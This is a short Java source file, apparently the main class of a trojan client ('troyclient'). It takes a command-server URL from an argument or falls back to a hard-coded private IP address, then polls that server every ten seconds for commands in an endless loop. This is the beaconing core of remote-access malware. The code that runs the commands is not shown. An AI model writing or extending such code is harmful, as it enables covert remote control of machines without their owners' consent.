package ch.lebois.troyclient;

import ch.lebois.troyclient.functions.CommandReciver;
import ch.lebois.troyclient.service.GetContext;

public class TroyClient {
    public static void main(String[] args) throws InterruptedException {
        if (args.length == 1) {
            GetContext.URL = args[0];
        } else {
            GetContext.URL = "http://192.168.100.153:8080";//TODO -> URL ici
        }

        CommandReciver commandReciver = new CommandReciver();
        while (true) {
            Thread.sleep(10000);
            commandReciver.readCommands();
        }
    }
}
